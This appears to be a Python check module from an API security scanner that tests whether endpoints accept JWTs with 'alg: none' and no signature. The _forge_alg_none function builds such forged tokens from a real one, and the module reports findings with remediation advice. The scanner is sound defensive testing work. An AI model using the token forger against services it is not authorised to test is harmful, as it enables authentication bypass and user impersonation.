"""API2:2023 — Broken Authentication via JWT 'alg:none' acceptance.

Logic:
  1. Take an authenticated user's real JWT.
  2. Forge a new token with the same payload but header alg set to "none"
     and no signature.
  3. Send a request to a protected endpoint with the forged token.
  4. If the server responds 200, it accepts unsigned tokens → auth bypass.
"""
from __future__ import annotations

import base64
import json
from typing import Optional

from apiforge.checks.base import BaseCheck
from apiforge.executor.http_executor import HttpExecutor
from apiforge.models import Endpoint, Finding, Severity, UserSession


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _forge_alg_none(token: str) -> Optional[str]:
    """Rebuild a JWT with alg=none and no signature, keeping the payload."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    # decode payload (add padding back)
    try:
        payload_raw = parts[1] + "=" * (-len(parts[1]) % 4)
        payload = json.loads(base64.urlsafe_b64decode(payload_raw))
    except Exception:
        return None
    header = {"alg": "none", "typ": "JWT"}
    h = _b64url(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}."  # trailing dot, empty signature


class JWTAlgNoneCheck(BaseCheck):
    check_id = "API2_JWT_ALG_NONE"
    name = "Broken Authentication — JWT alg:none Accepted"
    owasp_category = "API2:2023 Broken Authentication"
    cwe = "CWE-347"
    severity = Severity.CRITICAL
    cvss_score = 9.1

    def is_applicable(self, endpoint: Endpoint) -> bool:
        # Test on GET endpoints that normally require auth.
        return endpoint.method == "GET"

    async def run(
        self,
        endpoint: Endpoint,
        sessions: dict[str, UserSession],
        executor: HttpExecutor,
    ) -> Optional[Finding]:
        user = sessions.get("user_a")
        if not (user and user.authenticated and user.token):
            return None

# Baseline: does the real token get 200 here?
        real = await executor.send(
            method=endpoint.method, path=endpoint.path,
            token=user.token, headers=endpoint.headers, query=endpoint.query,
        )
        if real is None or real.status_code != 200:
            return None  # endpoint not accessible normally, skip

        # Control: does a GARBAGE token get rejected? If not, the endpoint
        # is effectively public and any token works — NOT an alg:none bug.
        garbage = await executor.send(
            method=endpoint.method, path=endpoint.path,
            token="garbage.invalid.token", headers=endpoint.headers,
            query=endpoint.query,
        )
        if garbage is None or garbage.status_code == 200:
            return None  # public endpoint, skip to avoid false positive

        forged = _forge_alg_none(user.token)
        if not forged:
            return None

        # Attack: send the forged alg:none token.
        attack = await executor.send(
            method=endpoint.method, path=endpoint.path,
            token=forged, headers=endpoint.headers, query=endpoint.query,
        )
        if attack is None:
            return None

        # Vuln signal: garbage was rejected, but forged alg:none is accepted.
        if attack.status_code == 200:
            return self._finding(
                endpoint=endpoint,
                attack_response=attack,
                description=(
                    f"The endpoint '{endpoint.path}' rejected an invalid token but "
                    f"accepted a JWT with algorithm set to 'none' and no signature. "
                    f"The server does not verify token signatures, allowing an "
                    f"attacker to forge tokens and impersonate any user."
                ),
                poc_request=(
                    f"{endpoint.method} {endpoint.path}\n"
                    f"Authorization: Bearer <forged-token-with-alg-none>"
                ),
                poc_response=f"HTTP {attack.status_code}\n{self._truncate(attack.text)}",
                remediation=(
                    f"Configure the JWT verifier behind {endpoint.path} (and every "
                    f"endpoint sharing this auth layer) to reject the 'none' "
                    f"algorithm and pin the expected signing algorithm (e.g. RS256 "
                    f"or HS256); always verify the signature. This is a single "
                    f"auth-layer fix, not a per-endpoint change."
                ),
            )
        return None
